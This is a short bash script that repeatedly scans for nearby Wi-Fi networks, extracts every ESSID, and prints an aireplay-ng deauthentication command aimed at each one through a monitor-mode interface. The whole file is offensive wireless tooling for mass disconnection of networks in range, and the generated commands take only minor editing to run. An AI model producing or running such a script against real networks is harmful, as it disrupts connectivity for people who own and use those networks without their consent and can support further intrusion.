#!/bin/bash
while true
do
    for i in $(iwlist wlo1 scanning | grep ESSID | cut -d":" -f2 | grep -v '""' | sed -e 's/"//g' ); 
		do echo "aireplay-ng -0 10 -e $i mon0 --ignore-negative-one"; 
    done;
    echo "Press [CTRL+C] to stop.."
    sleep 5
done 
